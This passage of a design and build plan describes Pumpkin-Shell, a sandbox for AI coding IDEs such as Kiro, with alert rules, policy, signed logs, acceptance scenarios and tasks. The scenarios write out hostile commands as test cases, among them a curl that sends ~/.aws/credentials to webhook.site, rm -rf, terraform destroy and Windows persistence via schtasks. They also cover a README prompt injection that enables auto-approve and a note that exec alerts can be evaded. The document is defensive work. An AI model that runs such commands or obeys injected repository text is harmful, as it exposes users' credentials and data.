EXEC-DESTRUCTIVE (terraform apply -auto-approve/destroy, kubectl delete, aws … delete-*, git push --force, DROP/TRUNCATE)	HIGH
EXEC-RECON (credential searches, trufflehog)	HIGH
WIN-PERSIST (schtasks, Run keys, startup folder, WMI process create)	HIGH; cleaned at exit
SBX-MONITOR-LOST	CRITICAL; session killed
POL-UNTRUSTED	WARN; loosening ignored
FR-NOTIFY: Notifications and response

INFO and NOTICE: written to the log and the session summary.
WARN: shown in pumpkin-shell watch, a tray or terminal panel.
HIGH: desktop notification (notify-send on Linux, a toast on Windows).
CRITICAL: also sent to a webhook (Slack, Discord or JSON), and the configured action runs. The default action is pause: SIGSTOP on Linux, or suspending the job's processes on Windows, until you resume or kill the session.
Repeated alerts are deduplicated, with at most one desktop notification every 10 seconds.
Pumpkin-Shell review shows blocked actions, staged writes to approve or reject, the diff of watched files, quarantined files and the restore command.
FR-POL: Policy

The user policy lives at ~/.config/pumpkin-shell/policy.toml (%APPDATA%\Pumpkin-Shell\ on Windows) and is never visible inside the sandbox.
The repo's pumpkin-shell.toml can only make rules stricter. trust pins its hash.
IDE profiles list paths, exact domains (taken from vendor docs and confirmed in monitor mode) and environment keys.
monitor mode logs instead of blocking, and policy suggest turns a monitor session into allow rules.
FR-RCPT: Signed log

JSONL records containing seq, the previous record's hash, policy_hash, rule, verdict and an ed25519 signature.
The key is stored outside the sandbox. A checkpoint is written at session end so a truncated log can be detected. log verify checks the chain.
CLI commands: doctor, init, ide <kiro|code|cursor|windsurf> [path], ide import <ide> (copies settings and extensions, never tokens), watch, allow, allow-write, resume, kill, review, restore, scan [--ci], trust, policy suggest, log [verify], test.

8. Acceptance scenarios (each runs on both OSes)
First run: Ubuntu's AppArmor restriction, or Windows without the service installed. doctor explains the fix in one step.
Signing in to Kiro: the browser opens on the host, the OAuth callback reaches the sandboxed Kiro, and the login persists in the sandboxed home.
README prompt injection enables auto-approve: the write is staged, a CRITICAL alert fires and the IDE pauses.
Agent asks Kiro to create a test-on-save hook: the hook works inside the session and you approve it in review.
Dependency published 2 hours ago with a postinstall script (the nx pattern): the version is hidden, the previous version installs and no script runs.
curl -d @~/.aws/credentials https://webhook.site: the agent reads a decoy (HIGH alert), and the domain is held and then denied.
Agent runs a local Postgres on host port 5432: NET-DIRECT-CONNECT fires with the hint to add host_ports = [5432].
rm -rf src/: WS-MASS-DELETE fires, and restore brings the files back.
terraform destroy in the IDE terminal: no cloud credentials are available, so it fails, and a HIGH alert fires.
Windows: the agent runs schtasks /create and a WMI process-create: both are flagged, network for the new process is still blocked, and both are removed at session end.
A pull request adds hidden Unicode to .kiro/steering: scan --ci fails the GitHub Actions run.
git push from the IDE: the git broker shows an approval prompt naming the remote and branch.
9. Non-functional requirements
Linux: no root at runtime. Kernel 5.13+ (6.7+ recommended), bwrap 0.8+.
Windows: admin once at install. No admin needed per session.
Performance:
launch overhead under 1 second
mirror adds under 15% with a warm cache
auditing adds under 5% to an npm test run
the IDE feels the same as running it outside the sandbox
Privacy and supply chain:
no telemetry
cargo-deny, cargo-audit and cargo vet in CI
signed releases: cosign and SLSA on Linux; Authenticode on Windows, with a signed MSI and a signed service so SmartScreen and Defender don't block it
no curl | sh installer
10. Success metrics
100% of the escape corpus passes on both OSes.
At most one false-positive HIGH alert per 8-hour dogfood session.
The top 50 npm and PyPI projects install without policy edits.
Install to first protected Kiro session in under 5 minutes.
11. Known risks (documented publicly)
Data sent to domains you allowed.
Kernel, bwrap or Windows privilege-escalation bugs.
Code the agent writes that you later run outside Pumpkin-Shell.
On Windows, the shared desktop exposes the clipboard, screen and keyboard to the sandboxed IDE.
Same-user signatures only prove tampering by the sandbox, not by you or by malware already on the host.
Exec argument alerts can be evaded. The real protection is that credentials aren't present.
12. Build plan
Task 1: Workspace, CI and doctor

Objective: a Cargo workspace with the SandboxBackend trait, and CI on Linux and Windows runners.
Guidance: doctor checks bwrap, user namespaces and AppArmor, Landlock and seccomp on Linux; on Windows it checks the service, the sandbox user and WFP status.
Tests: unit tests for parsing the check results.
Demo: pumpkin-shell doctor on both OSes.
Task 2: Linux proof of concept with Kiro

Objective: run Kiro in bwrap with Wayland, GPU access, nested user namespaces and a stub proxy.
Guidance: record every breakage and the minimum sandbox permissions that fix it.
Tests: scripted launch and smoke test.
Demo: Kiro edits a file, and ~/.ssh can't be read from its terminal.
Task 3: Windows proof of concept with Kiro

Objective: run Kiro as pks-sandbox inside a Job Object with WFP filters keyed to that user.
Guidance: confirm that a WMI- or schtasks-spawned process is still network-blocked, and that cleanup works.
Tests: scripted launch.
Demo: Kiro runs, C:\Users\<you>\.ssh is denied, and curl straight to the internet fails.
Task 4: pumpkin-shell scan, released as v0.1

Objective: detect hidden Unicode, autoApprove, MCP servers, Kiro command hooks, folderOpen tasks, yarnPath and alternate data streams.
Guidance: --ci sets the exit code.
Tests: one fixture repo per rule.
Demo: scanning a poisoned repo produces the expected findings on both OSes.
Task 5: Policy and signed log

Objective: the stricter-only policy merge, trust, the ed25519 hash chain and log verify.
Tests: property tests showing a repo policy can't loosen rules; tamper and truncation tests.
Demo: editing a log line makes log verify fail.
Task 6: Linux ide backend, filesystem and environment

Objective: the Linux sandbox: read-only root, read-write repo, persistent IDE home, filtered environment, no network.
Tests: FS, IPC, PROC and ENV escape tests.
Demo: Kiro launched through pumpkin-shell ide kiro ..
Task 7: Egress proxy, wired into the Linux backend

Objective: Unix-socket relay, exact-host allowlist, private-IP blocking, ask mode, byte counters.
Tests: NET-01 to NET-07.
Demo: Kiro chat works, and curl to an unknown domain triggers the ask prompt.
Task 8: Workspace integrity on Linux

Objective: staged writes, quarantine, snapshot and restore, decoys.
Tests: an agent-created hook doesn't reach the real repo unapproved; restore round-trips the working tree.
Demo: scenarios 3, 4 and 8.
Task 9: Notifications and review on Linux

Objective: severity engine, deduplication, watch, notify-send, webhook, pause, review and approval.
Tests: rate limiting; pause freezes the whole process tree.
Demo: a decoy read raises a desktop alert, and a CRITICAL alert pauses Kiro.
Task 10: Brokers on Linux

Objective: URL opening, OAuth callback relay, git push approval.
Tests: a fake OAuth server completes sign-in; a push triggers a prompt.
Demo: scenarios 2 and 12.
Task 11: Code-OSS adapter and IDE profiles, Linux v0.5 release

Objective: ide import and profiles for Kiro, VS Code, Cursor and Windsurf.
Tests: end-to-end launch of each IDE.
Demo: all four IDEs run under Pumpkin-Shell.
Task 12: npm and PyPI mirror

Objective: cooldown, package age, OSV lookups, typosquat checks, integrity checks, ignore-scripts.
Tests: REG tests against a fake registry; false-positive benchmark on the top 1,000 packages.
Demo: scenario 5.
Task 13: Linux exec and connect auditing

Objective: seccomp supervisor on the host, EXEC and NET-DIRECT-CONNECT rules.
Tests: performance budget; killing the monitor kills the session.
Demo: scenarios 7 and 9.
Task 14: Windows backend, enforcement

Objective: signed service and MSI, sandbox user, repo ACL grant and revoke, ownership reset, safe.directory, deny-ACL staging, WFP filters, Job Object, cleanup of processes and persistence.
Tests: the same escape corpus plus scenario 10.
Demo: pumpkin-shell ide kiro . on Windows.
Task 15: Windows feature parity

Objective: proxy settings, named-pipe brokers, toast notifications, ETW exec auditing, WFP connection auditing, ReadDirectoryChangesW watcher, pause by suspending processes.
Tests: all 12 scenarios on Windows.
Demo: the full Kiro session on Windows.
Task 16: v1.0 release

Objective: signed deb/rpm and MSI packages, AppArmor guidance, threat model and published escape corpus.
Tests: clean-install tests on every supported OS.
Demo: under 5 minutes from install to a protected Kiro session on Ubuntu 24.04 and Windows 11.
Estimate for one engineer:

v0.1 (scan): week 1
Linux v0.5: about week 8
Windows, which makes v1.0: about week 15
The largest risks are Tasks 2 and 3, the proofs of concept that the IDE runs at all inside each sandbox. They come first so the design can change before anything is built on top of them.


